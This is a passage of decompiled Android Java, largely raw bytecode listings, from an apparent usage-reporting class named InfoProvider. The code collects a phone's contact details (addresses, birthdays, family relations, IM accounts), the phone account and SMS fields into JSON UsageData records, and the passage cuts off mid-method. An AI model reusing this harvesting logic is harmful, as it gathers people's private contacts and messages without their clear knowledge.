    //   1769: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   1772: ifne +17 -> 1789
    //   1775: aload 11
    //   1777: ldc_w 491
    //   1780: aload 9
    //   1782: getfield 437	com/cootek/usage/InfoProvider$ImItem:protocol	Ljava/lang/String;
    //   1785: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1788: pop
    //   1789: aload 7
    //   1791: invokevirtual 481	org/json/JSONArray:length	()I
    //   1794: ifle -110 -> 1684
    //   1797: aload 7
    //   1799: aload 11
    //   1801: invokevirtual 145	org/json/JSONArray:put	(Ljava/lang/Object;)Lorg/json/JSONArray;
    //   1804: pop
    //   1805: goto -121 -> 1684
    //   1808: aload 5
    //   1810: ldc_w 492
    //   1813: aload 7
    //   1815: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1818: pop
    //   1819: aload 6
    //   1821: getfield 338	com/cootek/usage/InfoProvider$ContactItem:address	Ljava/util/HashSet;
    //   1824: invokevirtual 477	java/util/HashSet:isEmpty	()Z
    //   1827: ifne +132 -> 1959
    //   1830: new 96	org/json/JSONArray
    //   1833: dup
    //   1834: invokespecial 97	org/json/JSONArray:<init>	()V
    //   1837: astore 7
    //   1839: aload 6
    //   1841: getfield 338	com/cootek/usage/InfoProvider$ContactItem:address	Ljava/util/HashSet;
    //   1844: invokevirtual 478	java/util/HashSet:iterator	()Ljava/util/Iterator;
    //   1847: astore 8
    //   1849: aload 8
    //   1851: invokeinterface 471 1 0
    //   1856: ifeq +84 -> 1940
    //   1859: aload 8
    //   1861: invokeinterface 475 1 0
    //   1866: checkcast 8	com/cootek/usage/InfoProvider$AddressItem
    //   1869: astore 9
    //   1871: new 133	org/json/JSONObject
    //   1874: dup
    //   1875: invokespecial 134	org/json/JSONObject:<init>	()V
    //   1878: astore 11
    //   1880: aload 9
    //   1882: getfield 440	com/cootek/usage/InfoProvider$AddressItem:address	Ljava/lang/String;
    //   1885: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   1888: ifne -39 -> 1849
    //   1891: aload 11
    //   1893: ldc_w 494
    //   1896: aload 9
    //   1898: getfield 440	com/cootek/usage/InfoProvider$AddressItem:address	Ljava/lang/String;
    //   1901: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1904: pop
    //   1905: aload 9
    //   1907: getfield 443	com/cootek/usage/InfoProvider$AddressItem:type	Ljava/lang/String;
    //   1910: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   1913: ifne +16 -> 1929
    //   1916: aload 11
    //   1918: ldc -41
    //   1920: aload 9
    //   1922: getfield 443	com/cootek/usage/InfoProvider$AddressItem:type	Ljava/lang/String;
    //   1925: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1928: pop
    //   1929: aload 7
    //   1931: aload 11
    //   1933: invokevirtual 145	org/json/JSONArray:put	(Ljava/lang/Object;)Lorg/json/JSONArray;
    //   1936: pop
    //   1937: goto -88 -> 1849
    //   1940: aload 7
    //   1942: invokevirtual 481	org/json/JSONArray:length	()I
    //   1945: ifle +14 -> 1959
    //   1948: aload 5
    //   1950: ldc_w 483
    //   1953: aload 7
    //   1955: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1958: pop
    //   1959: aload 6
    //   1961: getfield 341	com/cootek/usage/InfoProvider$ContactItem:event	Ljava/util/HashSet;
    //   1964: invokevirtual 477	java/util/HashSet:isEmpty	()Z
    //   1967: ifne +131 -> 2098
    //   1970: new 96	org/json/JSONArray
    //   1973: dup
    //   1974: invokespecial 97	org/json/JSONArray:<init>	()V
    //   1977: astore 7
    //   1979: aload 6
    //   1981: getfield 341	com/cootek/usage/InfoProvider$ContactItem:event	Ljava/util/HashSet;
    //   1984: invokevirtual 478	java/util/HashSet:iterator	()Ljava/util/Iterator;
    //   1987: astore 8
    //   1989: aload 8
    //   1991: invokeinterface 471 1 0
    //   1996: ifeq +83 -> 2079
    //   1999: aload 8
    //   2001: invokeinterface 475 1 0
    //   2006: checkcast 17	com/cootek/usage/InfoProvider$EventItem
    //   2009: astore 9
    //   2011: new 133	org/json/JSONObject
    //   2014: dup
    //   2015: invokespecial 134	org/json/JSONObject:<init>	()V
    //   2018: astore 11
    //   2020: aload 9
    //   2022: getfield 446	com/cootek/usage/InfoProvider$EventItem:date	Ljava/lang/String;
    //   2025: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   2028: ifne -39 -> 1989
    //   2031: aload 11
    //   2033: ldc -44
    //   2035: aload 9
    //   2037: getfield 446	com/cootek/usage/InfoProvider$EventItem:date	Ljava/lang/String;
    //   2040: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   2043: pop
    //   2044: aload 9
    //   2046: getfield 450	com/cootek/usage/InfoProvider$EventItem:type	Ljava/lang/String;
    //   2049: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   2052: ifne +16 -> 2068
    //   2055: aload 11
    //   2057: ldc -41
    //   2059: aload 9
    //   2061: getfield 450	com/cootek/usage/InfoProvider$EventItem:type	Ljava/lang/String;
    //   2064: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   2067: pop
    //   2068: aload 7
    //   2070: aload 11
    //   2072: invokevirtual 145	org/json/JSONArray:put	(Ljava/lang/Object;)Lorg/json/JSONArray;
    //   2075: pop
    //   2076: goto -87 -> 1989
    //   2079: aload 7
    //   2081: invokevirtual 481	org/json/JSONArray:length	()I
    //   2084: ifle +14 -> 2098
    //   2087: aload 5
    //   2089: ldc_w 495
    //   2092: aload 7
    //   2094: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   2097: pop
    //   2098: aload 6
    //   2100: getfield 344	com/cootek/usage/InfoProvider$ContactItem:relation	Ljava/util/HashSet;
    //   2103: invokevirtual 477	java/util/HashSet:isEmpty	()Z
    //   2106: ifne +141 -> 2247
    //   2109: new 96	org/json/JSONArray
    //   2112: dup
    //   2113: invokespecial 97	org/json/JSONArray:<init>	()V
    //   2116: astore 7
    //   2118: aload 6
    //   2120: getfield 344	com/cootek/usage/InfoProvider$ContactItem:relation	Ljava/util/HashSet;
    //   2123: invokevirtual 478	java/util/HashSet:iterator	()Ljava/util/Iterator;
    //   2126: astore 6
    //   2128: aload 6
    //   2130: invokeinterface 471 1 0
    //   2135: ifeq +83 -> 2218
    //   2138: aload 6
    //   2140: invokeinterface 475 1 0
    //   2145: checkcast 29	com/cootek/usage/InfoProvider$RelationItem
    //   2148: astore 8
    //   2150: new 133	org/json/JSONObject
    //   2153: dup
    //   2154: invokespecial 134	org/json/JSONObject:<init>	()V
    //   2157: astore 9
    //   2159: aload 8
    //   2161: getfield 452	com/cootek/usage/InfoProvider$RelationItem:name	Ljava/lang/String;
    //   2164: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   2167: ifne -39 -> 2128
    //   2170: aload 9
    //   2172: ldc -120
    //   2174: aload 8
    //   2176: getfield 452	com/cootek/usage/InfoProvider$RelationItem:name	Ljava/lang/String;
    //   2179: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   2182: pop
    //   2183: aload 8
    //   2185: getfield 456	com/cootek/usage/InfoProvider$RelationItem:type	Ljava/lang/String;
    //   2188: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   2191: ifne +16 -> 2207
    //   2194: aload 9
    //   2196: ldc -41
    //   2198: aload 8
    //   2200: getfield 456	com/cootek/usage/InfoProvider$RelationItem:type	Ljava/lang/String;
    //   2203: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   2206: pop
    //   2207: aload 7
    //   2209: aload 9
    //   2211: invokevirtual 145	org/json/JSONArray:put	(Ljava/lang/Object;)Lorg/json/JSONArray;
    //   2214: pop
    //   2215: goto -87 -> 2128
    //   2218: aload 7
    //   2220: invokevirtual 481	org/json/JSONArray:length	()I
    //   2223: ifle +24 -> 2247
    //   2226: aload 5
    //   2228: ldc_w 496
    //   2231: aload 7
    //   2233: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   2236: pop
    //   2237: goto +10 -> 2247
    //   2240: astore 6
    //   2242: aload 6
    //   2244: invokevirtual 152	org/json/JSONException:printStackTrace	()V
    //   2247: aload_3
    //   2248: aload 5
    //   2250: invokevirtual 145	org/json/JSONArray:put	(Ljava/lang/Object;)Lorg/json/JSONArray;
    //   2253: pop
    //   2254: aload 10
    //   2256: iconst_1
    //   2257: putfield 149	com/cootek/usage/InfoProvider$InfoData:hasData	Z
    //   2260: goto -1073 -> 1187
    //   2263: aload_0
    //   2264: getfield 58	com/cootek/usage/InfoProvider:mAssist	Lcom/cootek/usage/AbsUsageAssist;
    //   2267: invokevirtual 499	com/cootek/usage/AbsUsageAssist:getPhoneAccount	()Ljava/lang/String;
    //   2270: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   2273: ifne +73 -> 2346
    //   2276: new 133	org/json/JSONObject
    //   2279: dup
    //   2280: invokespecial 134	org/json/JSONObject:<init>	()V
    //   2283: astore 4
    //   2285: aload 4
    //   2287: ldc -120
    //   2289: ldc_w 501
    //   2292: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   2295: pop
    //   2296: new 96	org/json/JSONArray
    //   2299: dup
    //   2300: invokespecial 97	org/json/JSONArray:<init>	()V
    //   2303: astore 5
    //   2305: aload 5
    //   2307: aload_0
    //   2308: getfield 58	com/cootek/usage/InfoProvider:mAssist	Lcom/cootek/usage/AbsUsageAssist;
    //   2311: invokevirtual 499	com/cootek/usage/AbsUsageAssist:getPhoneAccount	()Ljava/lang/String;
    //   2314: invokevirtual 145	org/json/JSONArray:put	(Ljava/lang/Object;)Lorg/json/JSONArray;
    //   2317: pop
    //   2318: aload 4
    //   2320: ldc_w 482
    //   2323: aload 5
    //   2325: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   2328: pop
    //   2329: goto +10 -> 2339
    //   2332: astore 5
    //   2334: aload 5
    //   2336: invokevirtual 152	org/json/JSONException:printStackTrace	()V
    //   2339: aload_3
    //   2340: aload 4
    //   2342: invokevirtual 145	org/json/JSONArray:put	(Ljava/lang/Object;)Lorg/json/JSONArray;
    //   2345: pop
    //   2346: new 156	com/cootek/usage/UsageData
    //   2349: dup
    //   2350: invokespecial 157	com/cootek/usage/UsageData:<init>	()V
    //   2353: astore 4
    //   2355: aload 4
    //   2357: aload_0
    //   2358: invokevirtual 160	com/cootek/usage/InfoProvider:getType	()Ljava/lang/String;
    //   2361: putfield 163	com/cootek/usage/UsageData:type	Ljava/lang/String;
    //   2364: aload 4
    //   2366: aload_0
    //   2367: iconst_0
    //   2368: invokevirtual 166	com/cootek/usage/InfoProvider:getPath	(I)Ljava/lang/String;
    //   2371: putfield 169	com/cootek/usage/UsageData:path	Ljava/lang/String;
    //   2374: aload 4
    //   2376: aload_3
    //   2377: invokevirtual 502	org/json/JSONArray:toString	()Ljava/lang/String;
    //   2380: putfield 173	com/cootek/usage/UsageData:value	Ljava/lang/String;
    //   2383: aload 10
    //   2385: aload 4
    //   2387: putfield 176	com/cootek/usage/InfoProvider$InfoData:data	Lcom/cootek/usage/UsageData;
    //   2390: aload 10
    //   2392: aload_0
    //   2393: iconst_0
    //   2394: invokevirtual 166	com/cootek/usage/InfoProvider:getPath	(I)Ljava/lang/String;
    //   2397: putfield 179	com/cootek/usage/InfoProvider$InfoData:infoPath	Ljava/lang/String;
    //   2400: aload 10
    //   2402: areturn
    //   2403: astore 4
    //   2405: aload_3
    //   2406: astore 5
    //   2408: aload 4
    //   2410: astore_3
    //   2411: aload 5
    //   2413: astore 4
    //   2415: goto +81 -> 2496
    //   2418: astore 5
    //   2420: aload 6
    //   2422: astore 4
    //   2424: aload 4
    //   2426: astore_3
    //   2427: aload 5
    //   2429: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   2432: aload 4
    //   2434: astore_3
    //   2435: aload 10
    //   2437: iconst_0
    //   2438: putfield 149	com/cootek/usage/InfoProvider$InfoData:hasData	Z
    //   2441: aload 4
    //   2443: ifnull +18 -> 2461
    //   2446: aload 4
    //   2448: invokeinterface 278 1 0
    //   2453: aload 10
    //   2455: areturn
    //   2456: astore_3
    //   2457: aload_3
    //   2458: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   2461: aload 10
    //   2463: areturn
    //   2464: aload 4
    //   2466: astore_3
    //   2467: aload 10
    //   2469: iconst_0
    //   2470: putfield 149	com/cootek/usage/InfoProvider$InfoData:hasData	Z
    //   2473: aload 4
    //   2475: ifnull +18 -> 2493
    //   2478: aload 4
    //   2480: invokeinterface 278 1 0
    //   2485: aload 10
    //   2487: areturn
    //   2488: astore_3
    //   2489: aload_3
    //   2490: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   2493: aload 10
    //   2495: areturn
    //   2496: aload 4
    //   2498: ifnull +20 -> 2518
    //   2501: aload 4
    //   2503: invokeinterface 278 1 0
    //   2508: goto +10 -> 2518
    //   2511: astore 4
    //   2513: aload 4
    //   2515: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   2518: aload_3
    //   2519: athrow
    //   2520: astore 4
    //   2522: aload_3
    //   2523: astore 5
    //   2525: aload 4
    //   2527: astore_3
    //   2528: aload 5
    //   2530: astore 4
    //   2532: goto +81 -> 2613
    //   2535: astore 5
    //   2537: aload 8
    //   2539: astore 4
    //   2541: aload 4
    //   2543: astore_3
    //   2544: aload 5
    //   2546: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   2549: aload 4
    //   2551: astore_3
    //   2552: aload 10
    //   2554: iconst_0
    //   2555: putfield 149	com/cootek/usage/InfoProvider$InfoData:hasData	Z
    //   2558: aload 4
    //   2560: ifnull +18 -> 2578
    //   2563: aload 4
    //   2565: invokeinterface 278 1 0
    //   2570: aload 10
    //   2572: areturn
    //   2573: astore_3
    //   2574: aload_3
    //   2575: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   2578: aload 10
    //   2580: areturn
    //   2581: aload 4
    //   2583: astore_3
    //   2584: aload 10
    //   2586: iconst_0
    //   2587: putfield 149	com/cootek/usage/InfoProvider$InfoData:hasData	Z
    //   2590: aload 4
    //   2592: ifnull +18 -> 2610
    //   2595: aload 4
    //   2597: invokeinterface 278 1 0
    //   2602: aload 10
    //   2604: areturn
    //   2605: astore_3
    //   2606: aload_3
    //   2607: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   2610: aload 10
    //   2612: areturn
    //   2613: aload 4
    //   2615: ifnull +20 -> 2635
    //   2618: aload 4
    //   2620: invokeinterface 278 1 0
    //   2625: goto +10 -> 2635
    //   2628: astore 4
    //   2630: aload 4
    //   2632: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   2635: aload_3
    //   2636: athrow
    //   2637: astore_3
    //   2638: aload 9
    //   2640: astore 4
    //   2642: goto -61 -> 2581
    //   2645: astore_3
    //   2646: goto -2406 -> 240
    //   2649: astore_3
    //   2650: aload 5
    //   2652: astore 4
    //   2654: goto -190 -> 2464
    //   2657: astore_3
    //   2658: goto -1514 -> 1144
    //   2661: goto -1541 -> 1120
    //   2664: goto -1824 -> 840
    //   2667: astore_3
    //   2668: goto -1552 -> 1116
    //   2671: iconst_0
    //   2672: istore_1
    //   2673: goto -1134 -> 1539
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	2676	0	this	InfoProvider
    //   1535	1138	1	i	int
    //   223	906	2	bool	boolean
    //   38	174	3	localContactItem	ContactItem
    //   231	1	3	localObject1	Object
    //   258	2	3	localRuntimeException1	RuntimeException
    //   265	224	3	localObject2	Object
    //   501	199	3	localRuntimeException2	RuntimeException
    //   712	387	3	localRuntimeException3	RuntimeException
    //   1111	1	3	localRuntimeException4	RuntimeException
    //   1115	2	3	localRuntimeException5	RuntimeException
    //   1135	1	3	localObject3	Object
    //   1162	2	3	localRuntimeException6	RuntimeException
    //   1174	1261	3	localObject4	Object
    //   2456	2	3	localRuntimeException7	RuntimeException
    //   2466	1	3	localObject5	Object
    //   2488	35	3	localRuntimeException8	RuntimeException
    //   2527	25	3	localObject6	Object
    //   2573	2	3	localRuntimeException9	RuntimeException
    //   2583	1	3	localObject7	Object
    //   2605	31	3	localRuntimeException10	RuntimeException
    //   2637	1	3	localSecurityException1	SecurityException
    //   2645	1	3	localSecurityException2	SecurityException
    //   2649	1	3	localSecurityException3	SecurityException
    //   2657	1	3	localSecurityException4	SecurityException
    //   2667	1	3	localRuntimeException11	RuntimeException
    //   74	2312	4	localObject8	Object
    //   2403	6	4	localObject9	Object
    //   2413	89	4	localObject10	Object
    //   2511	3	4	localRuntimeException12	RuntimeException
    //   2520	6	4	localObject11	Object
    //   2530	89	4	localObject12	Object
    //   2628	3	4	localRuntimeException13	RuntimeException
    //   2640	13	4	localObject13	Object
    //   35	1	5	localObject14	Object
    //   235	1	5	localRuntimeException14	RuntimeException
    //   463	640	5	localObject15	Object
    //   1139	1	5	localRuntimeException15	RuntimeException
    //   1216	1108	5	localObject16	Object
    //   2332	3	5	localJSONException1	JSONException
    //   2406	6	5	localObject17	Object
    //   2418	10	5	localRuntimeException16	RuntimeException
    //   2523	6	5	localObject18	Object
    //   2535	116	5	localRuntimeException17	RuntimeException
    //   32	2107	6	localObject19	Object
    //   2240	181	6	localJSONException2	JSONException
    //   46	2186	7	localJSONArray	JSONArray
    //   40	2498	8	localObject20	Object
    //   43	2596	9	localObject21	Object
    //   8	2603	10	localInfoData	InfoData
    //   29	2042	11	localObject22	Object
    //   20	247	12	localContentResolver	android.content.ContentResolver
    // Exception table:
    //   from	to	target	type
    //   81	91	231	finally
    //   91	224	231	finally
    //   81	91	235	java/lang/RuntimeException
    //   91	224	235	java/lang/RuntimeException
    //   248	255	258	java/lang/RuntimeException
    //   478	498	501	java/lang/RuntimeException
    //   518	580	501	java/lang/RuntimeException
    //   580	590	501	java/lang/RuntimeException
    //   606	643	501	java/lang/RuntimeException
    //   654	699	501	java/lang/RuntimeException
    //   699	709	501	java/lang/RuntimeException
    //   780	793	501	java/lang/RuntimeException
    //   643	654	712	java/lang/RuntimeException
    //   823	837	1111	java/lang/RuntimeException
    //   840	850	1111	java/lang/RuntimeException
    //   853	926	1111	java/lang/RuntimeException
    //   926	936	1111	java/lang/RuntimeException
    //   939	1012	1111	java/lang/RuntimeException
    //   1012	1022	1111	java/lang/RuntimeException
    //   1025	1098	1111	java/lang/RuntimeException
    //   1098	1108	1111	java/lang/RuntimeException
    //   428	448	1115	java/lang/RuntimeException
    //   455	474	1115	java/lang/RuntimeException
    //   505	514	1115	java/lang/RuntimeException
    //   593	602	1115	java/lang/RuntimeException
    //   716	775	1115	java/lang/RuntimeException
    //   416	424	1135	finally
    //   428	448	1135	finally
    //   455	474	1135	finally
    //   478	498	1135	finally
    //   505	514	1135	finally
    //   518	580	1135	finally
    //   580	590	1135	finally
    //   593	602	1135	finally
    //   606	643	1135	finally
    //   643	654	1135	finally
    //   654	699	1135	finally
    //   699	709	1135	finally
    //   716	775	1135	finally
    //   780	793	1135	finally
    //   793	818	1135	finally
    //   823	837	1135	finally
    //   840	850	1135	finally
    //   853	926	1135	finally
    //   926	936	1135	finally
    //   939	1012	1135	finally
    //   1012	1022	1135	finally
    //   1025	1098	1135	finally
    //   1098	1108	1135	finally
    //   1116	1120	1135	finally
    //   1120	1128	1135	finally
    //   416	424	1139	java/lang/RuntimeException
    //   1116	1120	1139	java/lang/RuntimeException
    //   1120	1128	1139	java/lang/RuntimeException
    //   1152	1159	1162	java/lang/RuntimeException
    //   1218	1261	2240	org/json/JSONException
    //   1261	1287	2240	org/json/JSONException
    //   1290	1309	2240	org/json/JSONException
    //   1309	1339	2240	org/json/JSONException
    //   1339	1419	2240	org/json/JSONException
    //   1419	1427	2240	org/json/JSONException
    //   1430	1449	2240	org/json/JSONException
    //   1449	1479	2240	org/json/JSONException
    //   1479	1534	2240	org/json/JSONException
    //   1539	1564	2240	org/json/JSONException
    //   1566	1591	2240	org/json/JSONException
    //   1593	1618	2240	org/json/JSONException
    //   1624	1632	2240	org/json/JSONException
    //   1635	1654	2240	org/json/JSONException
    //   1654	1684	2240	org/json/JSONException
    //   1684	1764	2240	org/json/JSONException
    //   1764	1789	2240	org/json/JSONException
    //   1789	1805	2240	org/json/JSONException
    //   1808	1819	2240	org/json/JSONException
    //   1819	1849	2240	org/json/JSONException
    //   1849	1929	2240	org/json/JSONException
    //   1929	1937	2240	org/json/JSONException
    //   1940	1959	2240	org/json/JSONException
    //   1959	1989	2240	org/json/JSONException
    //   1989	2068	2240	org/json/JSONException
    //   2068	2076	2240	org/json/JSONException
    //   2079	2098	2240	org/json/JSONException
    //   2098	2128	2240	org/json/JSONException
    //   2128	2207	2240	org/json/JSONException
    //   2207	2215	2240	org/json/JSONException
    //   2218	2237	2240	org/json/JSONException
    //   2285	2329	2332	org/json/JSONException
    //   266	411	2403	finally
    //   2427	2432	2403	finally
    //   2435	2441	2403	finally
    //   2467	2473	2403	finally
    //   266	411	2418	java/lang/RuntimeException
    //   2446	2453	2456	java/lang/RuntimeException
    //   2478	2485	2488	java/lang/RuntimeException
    //   2501	2508	2511	java/lang/RuntimeException
    //   48	76	2520	finally
    //   2544	2549	2520	finally
    //   2552	2558	2520	finally
    //   2584	2590	2520	finally
    //   48	76	2535	java/lang/RuntimeException
    //   2563	2570	2573	java/lang/RuntimeException
    //   2595	2602	2605	java/lang/RuntimeException
    //   2618	2625	2628	java/lang/RuntimeException
    //   48	76	2637	java/lang/SecurityException
    //   81	91	2645	java/lang/SecurityException
    //   91	224	2645	java/lang/SecurityException
    //   266	411	2649	java/lang/SecurityException
    //   416	424	2657	java/lang/SecurityException
    //   428	448	2657	java/lang/SecurityException
    //   455	474	2657	java/lang/SecurityException
    //   478	498	2657	java/lang/SecurityException
    //   505	514	2657	java/lang/SecurityException
    //   518	580	2657	java/lang/SecurityException
    //   580	590	2657	java/lang/SecurityException
    //   593	602	2657	java/lang/SecurityException
    //   606	643	2657	java/lang/SecurityException
    //   643	654	2657	java/lang/SecurityException
    //   654	699	2657	java/lang/SecurityException
    //   699	709	2657	java/lang/SecurityException
    //   716	775	2657	java/lang/SecurityException
    //   780	793	2657	java/lang/SecurityException
    //   793	818	2657	java/lang/SecurityException
    //   823	837	2657	java/lang/SecurityException
    //   840	850	2657	java/lang/SecurityException
    //   853	926	2657	java/lang/SecurityException
    //   926	936	2657	java/lang/SecurityException
    //   939	1012	2657	java/lang/SecurityException
    //   1012	1022	2657	java/lang/SecurityException
    //   1025	1098	2657	java/lang/SecurityException
    //   1098	1108	2657	java/lang/SecurityException
    //   1116	1120	2657	java/lang/SecurityException
    //   1120	1128	2657	java/lang/SecurityException
    //   793	818	2667	java/lang/RuntimeException
  }
  
  private String getEmailType(int paramInt)
  {
    switch (paramInt)
    {
    default: 
      return "";
    case 4: 
      return "MOBILE";
    case 3: 
      return "OTHER";
    case 2: 
      return "WORK";
    case 1: 
      return "HOME";
    }
    return null;
  }
  
  private String getEventType(int paramInt)
  {
    switch (paramInt)
    {
    default: 
      return "";
    case 3: 
      return "BIRTHDAY";
    case 2: 
      return "OTHER";
    case 1: 
      return "ANNIVERSARY";
    }
    return null;
  }
  
  private String getImProtocol(int paramInt)
  {
    switch (paramInt)
    {
    default: 
      return "";
    case 8: 
      return "NETMEETING";
    case 7: 
      return "JABBER";
    case 6: 
      return "ICQ";
    case 5: 
      return "GOOGLE_TALK";
    case 4: 
      return "QQ";
    case 3: 
      return "SKYPE";
    case 2: 
      return "YAHOO";
    case 1: 
      return "MSN";
    case 0: 
      return "AIM";
    }
    return null;
  }
  
  private String getImType(int paramInt)
  {
    switch (paramInt)
    {
    default: 
      return "";
    case 3: 
      return "OTHER";
    case 2: 
      return "WORK";
    case 1: 
      return "HOME";
    }
    return null;
  }
  
  private String getOrganizationType(int paramInt)
  {
    switch (paramInt)
    {
    default: 
      return "";
    case 2: 
      return "OTHER";
    case 1: 
      return "WORK";
    }
    return null;
  }
  
  private String getRelationType(int paramInt)
  {
    switch (paramInt)
    {
    default: 
      return "";
    case 14: 
      return "SPOUSE";
    case 13: 
      return "SISTER";
    case 12: 
      return "RELATIVE";
    case 11: 
      return "REFERRED_BY";
    case 10: 
      return "PARTNER";
    case 9: 
      return "PARENT";
    case 8: 
      return "MOTHER";
    case 7: 
      return "MANAGER";
    case 6: 
      return "FRIEND";
    case 5: 
      return "FATHER";
    case 4: 
      return "DOMESTIC_PARTNER";
    case 3: 
      return "CHILD";
    case 2: 
      return "BROTHER";
    case 1: 
      return "ASSISTANT";
    }
    return null;
  }
  
  /* Error */
  private InfoData getSms()
  {
    // Byte code:
    //   0: new 23	com/cootek/usage/InfoProvider$InfoData
    //   3: dup
    //   4: aload_0
    //   5: invokespecial 76	com/cootek/usage/InfoProvider$InfoData:<init>	(Lcom/cootek/usage/InfoProvider;)V
    //   8: astore 10
    //   10: aload_0
    //   11: getfield 58	com/cootek/usage/InfoProvider:mAssist	Lcom/cootek/usage/AbsUsageAssist;
    //   14: invokevirtual 82	com/cootek/usage/AbsUsageAssist:getContext	()Landroid/content/Context;
    //   17: invokevirtual 188	android/content/Context:getContentResolver	()Landroid/content/ContentResolver;
    //   20: astore 12
    //   22: new 96	org/json/JSONArray
    //   25: dup
    //   26: invokespecial 97	org/json/JSONArray:<init>	()V
    //   29: astore 11
    //   31: aconst_null
    //   32: astore 9
    //   34: aconst_null
    //   35: astore 8
    //   37: aconst_null
    //   38: astore 7
    //   40: aload 7
    //   42: astore 6
    //   44: invokestatic 194	com/cootek/usage/Settings:getInst	()Lcom/cootek/usage/Settings;
    //   47: aload_0
    //   48: iconst_2
    //   49: invokevirtual 166	com/cootek/usage/InfoProvider:getPath	(I)Ljava/lang/String;
    //   52: invokevirtual 198	com/cootek/usage/Settings:getLastInfoSuccessId	(Ljava/lang/String;)J
    //   55: lstore_1
    //   56: aload 7
    //   58: astore 6
    //   60: aload 12
    //   62: ldc_w 557
    //   65: invokestatic 288	android/net/Uri:parse	(Ljava/lang/String;)Landroid/net/Uri;
    //   68: bipush 6
    //   70: anewarray 206	java/lang/String
    //   73: dup
    //   74: iconst_0
    //   75: ldc -48
    //   77: aastore
    //   78: dup
    //   79: iconst_1
    //   80: ldc_w 483
    //   83: aastore
    //   84: dup
    //   85: iconst_2
    //   86: ldc_w 559
    //   89: aastore
    //   90: dup
    //   91: iconst_3
    //   92: ldc -44
    //   94: aastore
    //   95: dup
    //   96: iconst_4
    //   97: ldc_w 561
    //   100: aastore
    //   101: dup
    //   102: iconst_5
    //   103: ldc_w 563
    //   106: aastore
    //   107: ldc -39
    //   109: iconst_1
    //   110: anewarray 206	java/lang/String
    //   113: dup
    //   114: iconst_0
    //   115: lload_1
    //   116: invokestatic 221	java/lang/String:valueOf	(J)Ljava/lang/String;
    //   119: aastore
    //   120: ldc_w 565
    //   123: invokevirtual 229	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   126: astore 7
    //   128: aload 7
    //   130: ifnull +233 -> 363
    //   133: aload 7
    //   135: invokeinterface 235 1 0
    //   140: ifeq +223 -> 363
    //   143: aload 10
    //   145: aload 7
    //   147: iconst_0
    //   148: invokeinterface 239 2 0
    //   153: putfield 243	com/cootek/usage/InfoProvider$InfoData:lastId	J
    //   156: aload 7
    //   158: iconst_1
    //   159: invokeinterface 246 2 0
    //   164: astore 6
    //   166: aload 7
    //   168: iconst_2
    //   169: invokeinterface 239 2 0
    //   174: lstore_1
    //   175: lload_1
    //   176: lconst_0
    //   177: lcmp
    //   178: ifle +6 -> 184
    //   181: goto +149 -> 330
    //   184: aload 7
    //   186: iconst_3
    //   187: invokeinterface 239 2 0
    //   192: lstore_3
    //   193: aload 7
    //   195: iconst_4
    //   196: invokeinterface 246 2 0
    //   201: astore 8
    //   203: aload 7
    //   205: iconst_5
    //   206: invokeinterface 246 2 0
    //   211: astore 9
    //   213: new 133	org/json/JSONObject
    //   216: dup
    //   217: invokespecial 134	org/json/JSONObject:<init>	()V
    //   220: astore 12
    //   222: aload 12
    //   224: ldc -4
    //   226: aload 6
    //   228: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   231: pop
    //   232: aload 12
    //   234: ldc -44
    //   236: lload_3
    //   237: ldc2_w 253
    //   240: ldiv
    //   241: invokevirtual 257	org/json/JSONObject:put	(Ljava/lang/String;J)Lorg/json/JSONObject;
    //   244: pop
    //   245: aload 12
    //   247: ldc -41
    //   249: ldc_w 261
    //   252: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   255: pop
    //   256: lload_1
    //   257: lconst_0
